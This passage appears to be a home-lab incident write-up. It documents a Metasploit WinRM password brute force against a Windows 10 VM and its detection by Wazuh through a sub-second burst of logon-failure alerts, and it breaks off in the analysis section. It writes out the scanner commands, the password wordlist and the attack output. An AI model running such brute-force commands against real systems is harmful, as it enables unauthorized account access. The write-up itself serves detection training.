@@ -1,0 +1,130 @@
+# Incident 03 — WinRM Wordlist Brute Force
+
+## Summary
+A wordlist-based credential brute force attack was executed against 
+the exposed WinRM service (port 5985) using 11 password candidates. 
+Wazuh detected all 11 failed attempts via Rule 60122 (Level 5), 
+generating a clearly identifiable sub-second burst pattern in the 
+alert timeline — the hallmark signature of automated credential 
+stuffing distinguishable from manual login failures.
+
+## Environment
+| Component | Value |
+|---|---|
+| Attacker | Kali Linux 2025.3 (192.168.152.131) |
+| Target | Windows 10 MSEDGEWIN10 (192.168.152.129) |
+| SIEM | Wazuh 4.14.5 (192.168.152.130) |
+| Timestamp | 2026-07-01T01:09:14.271Z — 01:09:14.405Z |
+
+---
+
+## Step 1 — Attack Execution
+
+Metasploit's WinRM login scanner was used with a custom wordlist 
+containing 11 password candidates against the IEUser account.
+
+**Wordlist used:**
+```
+dummy, password, Password1, Passw0rd!, admin123, 
+Welcome1, letmein, IEUser, P@ssw0rd, EOF, (empty)
+```
+
+**Commands:**
+```
+use auxiliary/scanner/winrm/winrm_login
+set RHOSTS 192.168.152.129
+set USERNAME IEUser
+set PASSWORD dummy
+set PASS_FILE /tmp/passwords.txt
+run
+```
+
+**Result:**
+```
+[-] 192.168.152.129: - LOGIN FAILED: WORKSTATION\IEUser:dummy
+[-] 192.168.152.129: - LOGIN FAILED: WORKSTATION\IEUser:password
+[-] 192.168.152.129: - LOGIN FAILED: WORKSTATION\IEUser:Password1
+[-] 192.168.152.129: - LOGIN FAILED: WORKSTATION\IEUser:Passw0rd!
+[-] 192.168.152.129: - LOGIN FAILED: WORKSTATION\IEUser:admin123
+[-] 192.168.152.129: - LOGIN FAILED: WORKSTATION\IEUser:Welcome1
+[-] 192.168.152.129: - LOGIN FAILED: WORKSTATION\IEUser:letmein
+[-] 192.168.152.129: - LOGIN FAILED: WORKSTATION\IEUser:IEUser
+[-] 192.168.152.129: - LOGIN FAILED: WORKSTATION\IEUser:P@ssw0rd
+[-] 192.168.152.129: - LOGIN FAILED: WORKSTATION\IEUser:EOF
+[-] 192.168.152.129: - LOGIN FAILED: WORKSTATION\IEUser:
+[*] Scanned 1 of 1 hosts (100% complete)
+```
+
+![WinRM Wordlist Brute Force](../screenshots/incident03-winrm-bruteforce-wordlist.png)
+
+---
+
+## Step 2 — Detection
+
+Wazuh captured all 11 failed attempts as individual Windows Security 
+Event ID 4625 entries, all firing within a 134-millisecond window.
+
+**Alert timeline:**
+```
+01:09:14.271 — Logon Failure (Rule 60122, Level 5)
+01:09:14.281 — Logon Failure (Rule 60122, Level 5)
+01:09:14.296 — Logon Failure (Rule 60122, Level 5)
+01:09:14.312 — Logon Failure (Rule 60122, Level 5)
+01:09:14.327 — Logon Failure (Rule 60122, Level 5)
+01:09:14.343 — Logon Failure (Rule 60122, Level 5)
+01:09:14.358 — Logon Failure (Rule 60122, Level 5)
+01:09:14.374 — Logon Failure (Rule 60122, Level 5)
+01:09:14.390 — Logon Failure (Rule 60122, Level 5)
+01:09:14.405 — Logon Failure (Rule 60122, Level 5)
+```
+
+**Total window: 134 milliseconds for 10 visible alerts.**
+No human can type 10 passwords in 134ms — this timing pattern alone 
+is sufficient to classify this as automated tooling.
+
+![Wazuh Alert List](../screenshots/incident03-wazuh-alert-list.png)
+
+**Sample alert detail:**
+```json
+{
+  "rule": {
+    "id": "60122",
+    "level": 5,
+    "description": "Logon Failure - Unknown user or bad password",
+    "groups": ["windows", "windows_security", "authentication_failed"],
+    "mitre": {
+      "technique": ["Account Access Removal"],
+      "id": ["T1531"],
+      "tactic": ["Impact"]
+    },
+    "pci_dss": ["10.2.4", "10.2.5"],
+    "hipaa": ["164.312.b"],
+    "nist_800_53": ["AU.14", "AC.7"]
+  },
+  "data": {
+    "win": {
+      "eventdata": {
+        "targetUserName": "IEUser",
+        "targetDomainName": "WORKSTATION",
+        "authenticationPackageName": "NTLM",
+        "logonType": "3",
+        "status": "0xc000006d",
+        "subStatus": "0xc000006a"
+      },
+      "system": {
+        "eventID": "4625",
+        "severityValue": "AUDIT_FAILURE",
+        "computer": "MSEDGEWIN10"
+      }
+    }
+  },
+  "timestamp": "2026-07-01T01:09:14.405+0000"
+}
+```
+
+---
+
+## Analysis
+
+**Timing as a detection signal:**
+The 134ms burst window across 10+
